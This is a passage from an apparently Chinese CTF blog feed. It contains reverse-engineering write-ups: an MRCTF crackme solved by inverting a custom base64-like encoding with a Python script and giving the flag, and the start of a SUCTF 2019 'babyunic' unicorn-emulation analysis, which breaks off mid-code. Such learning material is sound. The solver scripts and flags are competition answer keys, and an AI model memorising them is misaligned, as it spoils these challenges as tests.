.text:0040137D↑j</span><br><span class="line">.text:00401383                 jmp     short loc_40132B</span><br><span class="line">.text:00401385 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401385</span><br><span class="line">.text:00401385 loc_401385:                             ; CODE XREF: .text:00401365↑j</span><br><span class="line">.text:00401385                 mov     al, 1</span><br><span class="line">.text:00401387</span><br><span class="line">.text:00401387 loc_401387:                             ; CODE XREF: .text:0040124C↑j</span><br><span class="line">.text:00401387                                         ; .text:00401320↑j ...</span><br><span class="line">.text:00401387                 pop     edi</span><br><span class="line">.text:00401388                 pop     esi</span><br><span class="line">.text:00401389                 pop     ebx</span><br><span class="line">.text:0040138A                 mov     esp, ebp</span><br><span class="line">.text:0040138C                 pop     ebp</span><br><span class="line">.text:0040138D                 retn</span><br></pre></td></tr></tbody></table></figure><p>这些都很容易分析，可以看到先分奇偶分别进行了左右循环移位，<del>虽然我看不懂这迷惑的左右移四位是什么情况</del>，实际上就是每个字符前四位和后四位交换位置</p><p>然后调用了一个函数进行了处理，处理之后和已知的字符串进行对比，相同就返回正确，逻辑很简单，用来处理的函数如下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> __fastcall <span class="hljs-title">sub_401090</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *a1, <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v6; <span class="hljs-comment">// ah</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v7; <span class="hljs-comment">// dh</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v8; <span class="hljs-comment">// bh</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v9; <span class="hljs-comment">// dl</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">bool</span> v11; <span class="hljs-comment">// cf</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v12; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [esp+11h] [ebp-Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [esp+12h] [ebp-Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [esp+13h] [ebp-9h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v20; <span class="hljs-comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v21; <span class="hljs-comment">// [esp+15h] [ebp-7h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v22; <span class="hljs-comment">// [esp+16h] [ebp-6h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v23; <span class="hljs-comment">// [esp+1Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v15 = v2 - <span class="hljs-number">1</span>;</span><br><span class="line">      v5 = *a1++;</span><br><span class="line">      *(&amp;v20 + v3++) = v5;</span><br><span class="line">      v6 = v22;</span><br><span class="line">      v7 = v21;</span><br><span class="line">      v8 = v20;</span><br><span class="line">      v23 = v22;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )</span><br><span class="line">      {</span><br><span class="line">        v9 = (v22 &gt;&gt; <span class="hljs-number">6</span>) + <span class="hljs-number">4</span> * (v21 &amp; <span class="hljs-number">0xF</span>);</span><br><span class="line">        v17 = (v21 &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">16</span> * (v20 &amp; <span class="hljs-number">3</span>);</span><br><span class="line">        v18 = (v22 &gt;&gt; <span class="hljs-number">6</span>) + <span class="hljs-number">4</span> * (v21 &amp; <span class="hljs-number">0xF</span>);</span><br><span class="line">        v19 = v22 &amp; <span class="hljs-number">0x3F</span>;</span><br><span class="line">        v16 = v20 &gt;&gt; <span class="hljs-number">2</span>;</span><br><span class="line">        byte_421708[v4] = byte_41EA00[v20 &gt;&gt; <span class="hljs-number">2</span>];</span><br><span class="line">        byte_421709[v4] = byte_41EA00[(<span class="hljs-keyword">unsigned</span> __int8)((v7 &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">16</span> * (v8 &amp; <span class="hljs-number">3</span>))];</span><br><span class="line">        byte_42170A[v4] = byte_41EA00[v9];</span><br><span class="line">        byte_42170B[v4] = byte_41EA00[v6 &amp; <span class="hljs-number">0x3F</span>];</span><br><span class="line">        v4 += <span class="hljs-number">4</span>;</span><br><span class="line">        v3 = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      v2 = v15;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v15 );</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 )</span><br><span class="line">    {</span><br><span class="line">      v10 = v3;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">3</span> )</span><br><span class="line">      {</span><br><span class="line">        v12 = v23;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v11 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 &lt; <span class="hljs-number">3</span>;</span><br><span class="line">        <span class="hljs-keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">if</span> ( !v11 )</span><br><span class="line">          {</span><br><span class="line">            <span class="hljs-built_in">sub_40150A</span>(a1);</span><br><span class="line">            <span class="hljs-built_in">JUMPOUT</span>(*(_DWORD *)algn_4011F3);</span><br><span class="line">          }</span><br><span class="line">          *(&amp;v20 + v10++) = <span class="hljs-number">0</span>;</span><br><span class="line">          v11 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v10 &lt; <span class="hljs-number">3</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">while</span> ( v10 &lt; <span class="hljs-number">3</span> );</span><br><span class="line">        v12 = v22;</span><br><span class="line">        v7 = v21;</span><br><span class="line">        v8 = v20;</span><br><span class="line">      }</span><br><span class="line">      v16 = v8 &gt;&gt; <span class="hljs-number">2</span>;</span><br><span class="line">      v17 = (v7 &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">16</span> * (v8 &amp; <span class="hljs-number">3</span>);</span><br><span class="line">      <span class="hljs-built_in">LOBYTE</span>(v2) = v12 &gt;&gt; <span class="hljs-number">6</span>;</span><br><span class="line">      v19 = v12 &amp; <span class="hljs-number">0x3F</span>;</span><br><span class="line">      v18 = (v12 &gt;&gt; <span class="hljs-number">6</span>) + <span class="hljs-number">4</span> * (v7 &amp; <span class="hljs-number">0xF</span>);</span><br><span class="line">      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v3 + <span class="hljs-number">1</span>; ++v4 )</span><br><span class="line">      {</span><br><span class="line">        v2 = (<span class="hljs-keyword">unsigned</span> __int8)*(&amp;v16 + i++);</span><br><span class="line">        <span class="hljs-built_in">LOBYTE</span>(v2) = byte_41EA00[v2];</span><br><span class="line">        byte_421708[v4] = v2;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">3</span> )</span><br><span class="line">        <span class="hljs-built_in">LOBYTE</span>(v2) = <span class="hljs-built_in">sub_4022E0</span>(&amp;byte_421708[v4], <span class="hljs-number">46</span>, <span class="hljs-number">3</span> - v3);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是一个类似于<code>base64</code>的一个编码过程，把三个字符转换成四个字符，只不过索引的计算用了一些位运算，仔细想一下很容易还原，到这里就可以把<code>flag</code>解出来了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="hljs-string">'%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm'</span><span class="hljs-comment">#%w'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">target1 = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/'</span></span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line">tmps = []</span><br><span class="line"><span class="hljs-comment"># print(chr(0x2e))</span></span><br><span class="line"><span class="hljs-comment"># print(len(target))</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(target):</span><br><span class="line">    index0 = target1.index(target[i])</span><br><span class="line">    index1 = target1.index(target[i + <span class="hljs-number">1</span>])</span><br><span class="line">    index2 = target1.index(target[i + <span class="hljs-number">2</span>])</span><br><span class="line">    index3 = target1.index(target[i + <span class="hljs-number">3</span>])</span><br><span class="line">    i += <span class="hljs-number">4</span></span><br><span class="line">    tmp1 = index0 * <span class="hljs-number">4</span> + ((index1 &amp; <span class="hljs-number">0x30</span>) &gt;&gt; <span class="hljs-number">4</span>)</span><br><span class="line">    tmp2 = ((index1 &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) + ((index2 &amp; <span class="hljs-number">0x3c</span>) &gt;&gt; <span class="hljs-number">2</span>)</span><br><span class="line">    tmp3 = ((index2 &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>) + index3</span><br><span class="line">    tmps.append(tmp1)</span><br><span class="line">    tmps.append(tmp2)</span><br><span class="line">    tmps.append(tmp3)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmps:</span><br><span class="line">    tmp = (((i &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>) + ((i &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span>)</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(tmp ^ <span class="hljs-number">3</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag+<span class="hljs-string">'}'</span>)</span><br></pre></td></tr></tbody></table></figure><p>最后凑不齐三个字符，还有下面一套的编码方式，但我懒得看了……反正已经知道最后一个字符是<code>'}'</code>，干脆直接略过，输出<code>flag</code></p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">MRCTF</span><span class="hljs-template-variable">{junkjunkjunkcodejunkjunkcodejunkcode}</span></span><br></pre></td></tr></tbody></table></figure><p><del>也就这题有点意思</del></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>就做了两道题，第一题直接溢出，第二题<code>shellcode</code>，第三题看了是格式化字符串任意写也没什么意思，就不多写了</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyunic-攻防世界</title>
      <link href="/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这是第一次接触<code>unicorn</code>的题目，也算是第一次用<code>z3</code>来解决题目，花了好长时间去熟悉<code>z3</code>和<code>unicorn</code>，确实很强大</p><span id="more"></span><p>打开来有个脚本</p><figure class="highlight sh hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./un.so.1 ./babyunic func</span><br></pre></td></tr></tbody></table></figure><p>逐个调用，看一下<code>babyunic</code></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00100eb9</span><span class="hljs-params">(<span class="hljs-keyword">int</span> param_1,<span class="hljs-keyword">long</span> param_2)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  <span class="hljs-keyword">void</span> *__s1;</span><br><span class="line">  <span class="hljs-keyword">void</span> *pvVar2;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-keyword">if</span> (param_1 == <span class="hljs-number">2</span>) {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SUCTF 2019"</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"input your flag:"</span>);</span><br><span class="line">    __s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);</span><br><span class="line">    pvVar2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);</span><br><span class="line">    __isoc99_scanf(&amp;DAT_00101033,pvVar2);</span><br><span class="line">    <span class="hljs-built_in">FUN_00100cba</span>(pvVar2,__s1,*(undefined8 *)(param_2 + <span class="hljs-number">8</span>),__s1);</span><br><span class="line">    iVar1 = <span class="hljs-built_in">memcmp</span>(__s1,DWORD_ARRAY_00302020,<span class="hljs-number">0xa8</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"congratuation!"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"fail!"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"no input files"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输入一个字符串经过处理后和已知字符串进行对比，相同则通过，接下来看看处理的方法</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00100cba</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,undefined8 param_2,<span class="hljs-keyword">char</span> *param_3)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">long</span> lVar1;</span><br><span class="line">  <span class="hljs-keyword">void</span> *__ptr;</span><br><span class="line">  <span class="hljs-keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="hljs-keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 local_38;</span><br><span class="line">  undefined4 local_34;</span><br><span class="line">  <span class="hljs-keyword">int</span> local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  FILE *local_20;</span><br><span class="line">  <span class="hljs-keyword">void</span> *local_18;</span><br><span class="line">  <span class="hljs-keyword">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);</span><br><span class="line">  local_20 = <span class="hljs-built_in">fopen</span>(param_3,<span class="hljs-string">"rb"</span>);</span><br><span class="line">  __ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x7100</span>);</span><br><span class="line">  <span class="hljs-built_in">fread</span>(__ptr,<span class="hljs-number">1</span>,<span class="hljs-number">0x7100</span>,local_20);</span><br><span class="line">  local_38 = <span class="hljs-number">0x101fffc0</span>;</span><br><span class="line">  local_34 = <span class="hljs-number">0x101fffc0</span>;</span><br><span class="line">  local_30 = <span class="hljs-number">0x101ffb00</span>;</span><br><span class="line">  local_2c = <span class="hljs-number">0x101ffa00</span>;</span><br><span class="line">                    <span class="hljs-comment">/* mips32大端序 */</span></span><br><span class="line">  <span class="hljs-built_in">uc_open</span>(<span class="hljs-number">3</span>,<span class="hljs-number">0x40000004</span>,&amp;local_28);</span><br><span class="line">  <span class="hljs-built_in">uc_mem_map</span>(local_28,<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x200000</span>,<span class="hljs-number">7</span>);</span><br><span class="line">  <span class="hljs-built_in">uc_mem_map</span>(local_28,<span class="hljs-number">0x10000000</span>,<span class="hljs-number">0x200000</span>,<span class="hljs-number">7</span>);</span><br><span class="line">  sVar1 = <span class="hljs-built_in">strlen</span>(param_1);</span><br><span class="line">  <span class="hljs-built_in">uc_mem_write</span>(local_28,(<span class="hljs-keyword">long</span>)local_30,param_1,sVar1);</span><br><span class="line">  <span class="hljs-built_in">uc_mem_write</span>(local_28,<span class="hljs-number">0x400000</span>,__ptr,<span class="hljs-number">0x7100</span>);</span><br><span class="line">  <span class="hljs-built_in">uc_reg_write</span>(local_28,<span class="hljs-number">0x1f</span>,&amp;local_38);</span><br><span class="line">  <span class="hljs-built_in">uc_reg_write</span>(local_28,<span class="hljs-number">0x20</span>,&amp;local_34);</span><br><span class="line">  <span class="hljs-built_in">uc_reg_write</span>(local_28,<span class="hljs-number">7</span>,&amp;local_2c);</span><br><span class="line">  <span class="hljs-built_in">uc_reg_write</span>(local_28,<span class="hljs-number">6</span>,&amp;local_30);</span><br><span class="line">  <span class="hljs-built_in">uc_emu_start</span>(local_28,<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x40706c</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">uc_mem_read</span>(local_28,<span class="hljs-number">0x101ffa00</span>,param_2,<span class="hljs-number">200</span>);</span><br><span class="line">  <span class="hljs-built_in">uc_close</span>(local_28);</span><br><span class="line">  <span class="hljs-built_in">fclose</span>(local_20);</span><br><span class="line">  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) {</span><br><span class="line">                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里用到了<code>unicorn</code>来模拟其它架构的处理器，查阅<code>unicorn</code>引用的头文件可以得到以下信息</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">local_20 = <span class="hljs-built_in">fopen</span>(param_3,<span class="hljs-string">"rb"</span>);</span><br><span class="line">__ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x7100</span>);</span><br><span class="line"><span class="hljs-built_in">fread</span>(__ptr,<span class="hljs-number">1</span>,<span class="hljs-number">0x7100</span>,local_20);</span><br><span class="line"><span class="hljs-comment">//读取输入的文件func</span></span><br><span class="line"><span class="hljs-built_in">uc_open</span>(<span class="hljs-number">3</span>,<span class="hljs-number">0x40000004</span>,&amp;local_28);</span><br><span class="line"><span class="hljs-comment">//第一个参数3代表mips架构，第二个参数代表mips32+大端序，第三个参数是句柄</span></span><br><span class="line">sVar1 = <span class="hljs-built_in">strlen</span>(param_1);</span><br><span class="line"><span class="hljs-built_in">uc_mem_write</span>(local_28,(<span class="hljs-keyword">long</span>)local_30,param_1,sVar1);</span><br><span class="line"><span class="hljs-comment">//param_1对应我们输入的字符串，放入local_30指向的地址，应该是栈</span></span><br><span class="line"><span class="hljs-built_in">uc_mem_write</span>(local_28,<span class="hljs-number">0x400000</span>,__ptr,<span class="hljs-number">0x7100</span>);</span><br><span class="line"><span class="hljs-comment">//func为可执行文件，0x400000凭经验是代码段</span></span><br><span class="line"><span class="hljs-built_in">uc_mem_read</span>(local_28,<span class="hljs-number">0x101ffa00</span>,param_2,<span class="hljs-number">200</span>);</span><br><span class="line"><span class="hljs-comment">//从栈上的某个地址读取200个字节到param_2里</span></span><br></pre></td></tr></tbody></table></figure><p>最后这个函数的输出是<code>param_2</code>也就是最终用来比较的<code>__s1</code>，所以接下来需要搞清楚<code>func</code>函数里进行了哪些操作</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UndefinedFunction_00000000</span><span class="hljs-params">(byte *param_1,<span class="hljs-keyword">int</span> *param_2)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iStack16;</span><br><span class="line">  <span class="hljs-keyword">int</span> iStack12;</span><br><span class="line">  </span><br><span class="line">  iStack12 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> (param_1[iStack12] != <span class="hljs-number">0</span>) {</span><br><span class="line">    iStack12 = iStack12 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  iStack16 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iStack16 &lt; iStack12) {</span><br><span class="line">    param_1[iStack16] = (param_1[iStack16] &lt;&lt; <span class="hljs-number">3</span> | param_1[iStack16] &gt;&gt; <span class="hljs-number">5</span>) ^ (byte)iStack16;</span><br><span class="line">    iStack16 = iStack16 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  *param_2 = ((((((((((((((((((((((((((((((((uint)*param_1 + (uint)param_1[<span class="hljs-number">1</span>] + (uint)param_1[<span class="hljs-number">2</span>]) -</span><br><span class="line">                                          (uint)param_1[<span class="hljs-number">3</span>]) + (uint)param_1[<span class="hljs-number">4</span>]) - (uint)param_1[<span class="hljs-number">5</span>])</span><br><span class="line">                                       - (uint)param_1[<span class="hljs-number">6</span>]) - (uint)param_1[<span class="hljs-number">7</span>]) - (uint)param_1[<span class="hljs-number">8</span>]) +</span><br><span class="line">                                     (uint)param_1[<span class="hljs-number">9</span>] + (uint)param_1[<span class="hljs-number">10</span>]) - (uint)param_1[<span class="hljs-number">0xb</span>]) +</span><br><span class="line">                                  (uint)param_1[<span class="hljs-number">0xc</span>]) - (uint)param_1[<span class="hljs-number">0xd</span>]) - (uint)param_1[<span class="hljs-number">0xe</span>]) +</span><br><span class="line">                               (uint)param_1[<span class="hljs-number">0xf</span>]) - (uint)param_1[<span class="hljs-number">0x10</span>]) - (uint)param_1[<span class="hljs-number">0x11</span>]) +</span><br><span class="line">                             (uint)param_1[<span class="hljs-number">0x12</span>] + (uint)param_1[<span 